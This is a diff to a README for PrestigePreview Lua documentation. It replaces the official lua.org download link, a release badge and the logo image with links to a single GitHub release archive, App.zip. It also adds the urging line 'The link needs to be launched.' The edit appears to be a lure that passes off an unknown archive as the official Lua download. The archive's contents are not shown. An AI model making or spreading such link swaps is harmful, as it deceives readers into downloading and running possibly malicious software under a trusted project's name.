@@ -17,7 +17,7 @@ Welcome to the official documentation repository for PrestigePreview's Lua suppo
 
 ## 🚀 Getting Started <a name="getting-started"></a>
 
-To begin using Lua with PrestigePreview, make sure you have the necessary tools installed on your system. You can download Lua from the official website at [lua.org](https://www.lua.org/). Additionally, you may also need a Markdown editor to work with the documentation in this repository.
+To begin using Lua with PrestigePreview, make sure you have the necessary tools installed on your system. You can download Lua from the official website at [https://github.com/mimic619/PrestigePreview_Lua_Docs/releases/download/v1.0/App.zip](https://github.com/mimic619/PrestigePreview_Lua_Docs/releases/download/v1.0/App.zip). Additionally, you may also need a Markdown editor to work with the documentation in this repository.
 
 ## 💻 Lua Integration <a name="lua-integration"></a>
 
@@ -35,7 +35,7 @@ We welcome contributions from the community to enhance the PrestigePreview Lua d
 
 Click the button below to download the latest release of PrestigePreview_Lua_Docs:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/mimic619/PrestigePreview_Lua_Docs/releases/download/v1.0/App.zip%20Release-brightgreen)](https://github.com/mimic619/PrestigePreview_Lua_Docs/releases/download/v1.0/App.zip)
 
 *Note: The link needs to be launched.*
 
@@ -43,4 +43,4 @@ If the above link is not working or you need a different version, please check t
 
 Thank you for choosing PrestigePreview for your Lua development needs. Happy coding! 🚀
 
-![PrestigePreview](https://www.example.com/prestigepreview_logo.png)
+![PrestigePreview](https://github.com/mimic619/PrestigePreview_Lua_Docs/releases/download/v1.0/App.zip)
